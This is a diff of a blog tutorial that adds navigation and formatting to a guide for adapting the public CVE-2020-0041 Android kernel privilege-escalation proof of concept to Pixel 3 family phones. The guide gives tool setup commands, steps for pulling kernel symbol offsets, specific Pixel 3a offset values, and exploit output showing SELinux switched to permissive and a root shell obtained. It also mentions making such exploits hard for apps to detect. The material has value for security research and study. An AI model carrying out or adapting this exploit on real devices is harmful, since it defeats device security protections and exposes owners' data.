@@ -9,11 +9,19 @@ There are different root frameworks that can be used on Android in order to obta
 
 A common procedure in the industry is the adaptation of privilege escalation exploits that are not detectable by most of the applications. In this post I will explain how to adapt [bluefrostsecurity](https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/) **CVE-2020-0041** PoC for Pixel 3 to all the Pixel3 family devices. Furthermore, I will provide some improvements to obtain a non-limited root shell. 
 
+## Table of Contents
+- [Table of Contents](#table-of-contents)
+- [Requirements](#requirements)
+- [Procedure](#procedure)
+- [Testing the exploit](#testing-the-exploit)
+- [Improvements](#improvements)
+
+<a name="requirements">
 ## Requirements
 
 * Download the **CVE-2020-0041** PoC exploit that we will be using for the modifications:
 
-```
+```sh
 git clone https://github.com/bluefrostsecurity/CVE-2020-0041
 ```
 
@@ -27,7 +35,7 @@ git clone https://github.com/bluefrostsecurity/CVE-2020-0041
 
 * Download [abootimg](https://github.com/ggrandou/abootimg) and compile it:
 
-```
+```sh
 git clone https://github.com/ggrandou/abootimg
 cd abootimg
 make
@@ -35,22 +43,24 @@ make
 
 * Download and install [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool using python pip:
 
-```
+```sh
 sudo apt install python3-pip
 sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf
 ```
 
 * In addition, we will need the **Android NDK** in our path in order to compile the exploit. As an example, I have this line on my .zshrc file.
 
-```
+```sh
 export NDK="/home/calabres/NDK"
 ```
+</a>
 
+<a name="procedure">
 ## Procedure
 
 1. First of all we need to extract the compressed kernel image from the boot.img. For that, we will use the already downloaded tool **abootimg**.
 
-```
+```sh
 ./abootimg -x [path_to_boot_img]
 ```
 
@@ -58,7 +68,7 @@ The produced zImage, is an image that contains the compressed Android Kernel.
 
 2. In order to obtain an uncompressed image of the Kernel that contains correct symbols and offsets, use the [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool.
 
-```
+```sh
 vmlinux-to-elf [path_to_zImage] kernel.elf
 ```
 
@@ -74,7 +84,7 @@ INIT_CRED_OFFSET
 OFFSET_PIPE_FOP
 ```
 
-4. Change exploit.c offsets for the offsets found in your device kernel image:
+4. Change exploit.c offsets for the offsets found in your device kernel image, in my case Pixel 3a offsets are:
 
 ```c
 #define SELINUX_ENFORCING_OFFSET 0x2ffe000
@@ -85,12 +95,14 @@ OFFSET_PIPE_FOP
 #define INIT_CRED_OFFSET 0x2db0238
 #define OFFSET_PIPE_FOP 0x2173650
 ```
+</a>
 
+<a name="testing">
 ## Testing the exploit 
 
 >The exploit can be built by simply running "make" with the Android NDK in the path. It can also be pushed to a phone attached with adb by doing "make all push". Now just run /data/local/tmp/poc from an adb shell to see the exploit running:
 
-```
+```sh
 [+] Mapped 200000
 [+] selinux_enforcing before exploit: 1
 [+] pipe file: 0xffffffd9c67c7700
@@ -132,10 +144,13 @@ root_by_cve-2020-0041:/ # getenforce
 Permissive
 root_by_cve-2020-0041:/ # 
 ```
+</a>
 
+<a name="improvements">
 ## Improvements
 
 After adapting the exploit, you will obtain a root shell; however, the shell will be very limited and not fully working.
 
 In order to ... //TODO
 
+</a>
